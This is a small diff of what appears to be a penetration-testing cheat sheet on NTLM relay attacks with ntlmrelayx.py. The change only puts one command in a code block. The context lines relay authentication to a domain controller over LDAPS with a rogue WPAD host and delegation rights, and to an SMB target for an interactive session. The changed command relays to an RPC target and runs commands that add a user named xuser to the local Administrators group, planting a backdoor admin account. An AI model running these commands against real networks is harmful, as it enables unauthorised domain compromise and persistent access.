@@ -53,4 +53,6 @@ ntlmrelayx.py -t ldaps://icorp-dc.internal.corp -wh attacker-wpad --delegate-acc
 ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
 ```
 ## Or
-$ ntlmrelayx.py -ip 0.0.0.0 -t rpc://example.local -c "net user xuser xpass /add && net localgroup Administrators xuser /add"
+```
+ntlmrelayx.py -ip 0.0.0.0 -t rpc://example.local -c "net user xuser xpass /add && net localgroup Administrators xuser /add"
+```
